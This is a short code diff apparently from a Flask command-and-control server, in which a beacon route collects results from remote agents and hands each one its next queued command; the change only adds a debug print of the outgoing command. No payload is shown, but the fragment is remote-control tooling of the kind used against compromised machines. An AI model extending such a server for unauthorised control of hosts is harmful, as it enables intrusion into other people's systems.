@@ -23,6 +23,7 @@ def beacon():
         results.setdefault(agent_id, []).append(data["result"])
         print(f"\n[{agent_id}] Result:\n{data['result']}")
     cmd = pending_commands.pop(agent_id, None)
+    print(f"[DEBUG] Sending command to {agent_id}: '{cmd}'")  # see what command is being sent back
     return jsonify({"cmd": cmd})
 
 @app.route("/issue", methods=["POST"])
